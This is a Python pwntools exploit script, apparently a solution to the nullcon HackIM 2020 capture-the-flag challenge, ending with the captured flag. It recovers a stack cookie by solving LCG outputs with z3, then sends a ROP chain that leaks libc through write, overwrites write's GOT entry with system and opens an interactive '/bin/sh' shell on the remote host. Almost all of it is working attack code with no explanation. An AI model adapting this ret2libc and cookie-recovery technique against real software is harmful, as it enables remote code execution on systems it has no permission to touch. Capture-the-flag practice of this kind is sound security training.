#!/usr/bin/python3
import pwn
import z3


HOST, PORT = 'pwn3.ctf.nullcon.net', 1234

libc = pwn.ELF('./libc.so.6')

p = pwn.remote(HOST, PORT)
pwn.context.log_level = 'debug'

p.recvuntil('I think I dropped something yummy! sssh')

chips = [0] * 10
for i in range(10):
    chips[i // 5 + 2 * (i % 5)] = int(p.recvline(keepends=False))

p.recvuntil('hello\n')

cookie = chip = z3.BitVec('cookie', 64)
s = z3.Solver()

for i in range(10):
    chip = 0x5DEECE66D * chip + 11
    s.add((chip >> 16) & 0xFFFFFFFF == chips[i])

pwn.log.info(s.check())

cookie = s.model()[cookie].as_long() ^ 0x5DEECE66D
pwn.log.info('COOKIE: {:016X}'.format(cookie))

write_plt = 0x400660
read_plt = 0x400690
pop_rsi_pop_ret = 0x400AB1
pop_rdi_ret = 0x400AB3
ret = 0x400AB4
write_got = 0x601020
bss = 0x6010A0

payload = b'A' * 0x14
payload += pwn.p64(cookie)
payload = payload.ljust(0x48, b'\x00')
payload += pwn.p64(pop_rdi_ret)
payload += pwn.p64(1)
payload += pwn.p64(pop_rsi_pop_ret)
payload += pwn.p64(write_got)
payload += b'A' * 8
payload += pwn.p64(write_plt)
payload += pwn.p64(pop_rdi_ret)
payload += pwn.p64(0)
payload += pwn.p64(pop_rsi_pop_ret)
payload += pwn.p64(write_got)
payload += b'A' * 8
payload += pwn.p64(read_plt)
payload += pwn.p64(pop_rdi_ret)
payload += pwn.p64(0)
payload += pwn.p64(pop_rsi_pop_ret)
payload += pwn.p64(bss)
payload += b'A' * 8
payload += pwn.p64(read_plt)
payload += pwn.p64(pop_rdi_ret)
payload += pwn.p64(bss)
payload += pwn.p64(ret)
payload += pwn.p64(write_plt)
payload = payload.ljust(0x1F4, b'\x00')

p.send(payload)

write_libc = pwn.u64(p.recvn(8))
libc_base = write_libc - libc.symbols[b'write']

pwn.log.info('libc.so.6: 0x{:012X}'.format(libc_base))

system_libc = libc_base + libc.symbols[b'system']

p.send(pwn.p64(system_libc))
p.send(b'/bin/sh\x00')

pwn.context.log_level = 'info'
p.interactive()

# hackim20{h3r3s_4_g1ft_fr0m_m1ster_k1pl1ng}
